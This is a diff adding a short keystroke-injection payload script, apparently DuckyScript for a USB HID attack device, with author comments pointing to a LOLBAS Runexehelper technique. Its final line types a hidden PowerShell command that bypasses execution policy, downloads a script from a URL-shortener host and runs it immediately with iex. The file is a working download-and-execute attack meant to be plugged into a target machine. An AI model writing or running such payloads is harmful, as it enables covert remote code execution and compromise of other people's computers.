@@ -1,0 +1,5 @@
+REM By Joshua O' Brien
+REM Launches the specified exe, prereqs should be taken care of in ps.1 file, more info here https://lolbas-project.github.io/lolbas/Binaries/Runexehelper/
+REM uses runexehelper_exe.ps1
+DEFAULT_DELAY 350 
+STRING powershell -NoP -Ep Bypass -W H -C irm tnyr.me/ykg68L3B3s | iex
